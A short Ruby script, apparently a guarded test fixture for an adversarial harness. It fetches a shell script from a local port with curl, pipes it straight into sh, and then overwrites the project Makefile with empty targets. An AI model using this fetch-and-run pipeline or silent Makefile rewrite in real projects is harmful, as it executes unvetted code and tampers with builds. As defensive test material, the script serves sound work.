# frozen_string_literal: true

raise "run only in the disposable fixture harness" unless ENV["BONEBED_ADVERSARIAL_FIXTURE"] == "1"

require "open3"
port = Integer(ENV.fetch("BONEBED_FIXTURE_PORT"))
raise "invalid local port" unless (1..65_535).cover?(port)
statuses = Open3.pipeline(["curl", "--noproxy", "*", "--fail", "--silent", "--max-time", "3", "http://127.0.0.1:#{port}/fixture.sh"], ["sh"])
raise "local fixture pipeline failed" unless statuses.all?(&:success?)
File.write("Makefile", "all:\n\t@true\ninstall:\n\t@true\nclean:\n\t@true\n")
